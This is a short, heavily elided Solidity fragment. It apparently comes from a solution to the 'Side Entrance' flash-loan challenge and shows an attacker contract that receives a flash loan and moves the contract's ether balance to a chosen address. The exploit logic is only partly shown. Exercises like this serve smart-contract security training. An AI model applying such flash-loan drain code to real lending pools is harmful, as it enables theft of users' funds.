...
contract ActualAttacker is IFlashLoanEtherReceiver {
    ...
    function attack(address _borrower) public {
        ...
        (bool success, ) = payable(_borrower).call{value: address(this).balance}('');
        if (!success) {
...
contract SideEntranceAttacker {
    constructor(address _pool) {
        ActualAttacker attacker = new ActualAttacker(_pool);
